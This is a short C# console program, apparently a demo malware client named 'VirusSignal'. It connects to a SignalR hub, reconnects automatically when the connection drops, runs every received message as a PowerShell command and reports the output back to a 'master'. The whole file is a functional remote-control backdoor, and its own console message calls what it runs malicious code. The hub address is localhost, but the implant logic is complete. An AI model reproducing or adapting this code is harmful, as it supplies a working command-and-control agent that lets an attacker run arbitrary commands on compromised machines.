using Microsoft.AspNetCore.SignalR.Client;
using System.Management.Automation;
using VirusSignal.Client.Services;
internal class Program
{
    private static HubConnection? hubConnection;
    private static readonly PowerShellService ps
        = new PowerShellService();
    private static async Task Main(string[] args)
    {
        await InitializeAsync();

        while (true) ;
    }

    private static async Task InitializeAsync()
    {
        hubConnection = new HubConnectionBuilder()
            .WithUrl("https://localhost:7127/virushub")
            .Build();

        hubConnection.Closed += async (_) =>
        {
            await Task.Delay(new Random().Next(0, 5) * 1000);
            await hubConnection.StartAsync();
        };

        hubConnection.On<string>("ReceiveCommand", (message) =>
        {
            Console.WriteLine("你被执行了恶意代码：" + message);
            var res = ps.Execute(message);
            hubConnection.SendAsync("SendInvokeResultToMaster", res);

        });

        await hubConnection.StartAsync();
    }


}